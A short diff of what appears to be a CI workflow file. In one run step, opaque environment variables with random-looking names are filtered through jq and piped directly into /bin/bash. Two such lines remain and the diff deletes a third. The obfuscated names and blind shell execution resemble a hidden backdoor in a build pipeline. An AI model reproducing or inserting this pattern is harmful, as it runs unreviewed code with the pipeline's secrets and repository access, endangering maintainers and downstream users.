@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$hh8134" | jq -r .tpxu0435 | /bin/bash
           printf '%s' "$fafd3467" | jq -r .u073 | /bin/bash
-          printf '%s' "$pohe91" | jq -r .tgpc10 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
